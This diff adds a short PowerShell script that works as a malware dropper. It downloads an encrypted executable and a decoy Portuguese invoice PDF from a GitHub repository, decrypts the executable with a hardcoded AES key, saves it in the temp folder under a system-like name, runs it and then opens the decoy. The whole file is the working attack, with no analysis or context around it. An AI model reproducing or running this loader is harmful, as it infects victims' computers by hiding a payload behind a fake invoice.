@@ -1,0 +1,12 @@
+$t=$env:TEMP
+try{[Net.ServicePointManager]::SecurityProtocol=3072}catch{}
+iwr 'https://raw.githubusercontent.com/dinothunderrangerwhite1/portal-docs/main/payload/default.exe' -OutF "$t\p" -useb
+iwr 'https://raw.githubusercontent.com/dinothunderrangerwhite1/portal-docs/main/Application%20Files/InstallUtil_4_0_0_0/Fatura_Novembro_2026.pdf' -OutF "$t\f.pdf" -useb
+$a=[Security.Cryptography.Aes]::Create()
+$a.Key=[Convert]::FromBase64String('TBGaPwK+d1jBMOYphA36UWsnCJNFrB5g1zm/QgWIHPA=')
+$a.IV=[Convert]::FromBase64String('nSZLcegDX7QSyWfeMKWLHw==')
+$c=[IO.File]::ReadAllBytes("$t\p")
+$r=$a.CreateDecryptor().TransformFinalBlock($c,0,$c.Length)
+[IO.File]::WriteAllBytes("$t\msimg32.exe",$r)
+start "$t\msimg32.exe"
+start "$t\f.pdf"
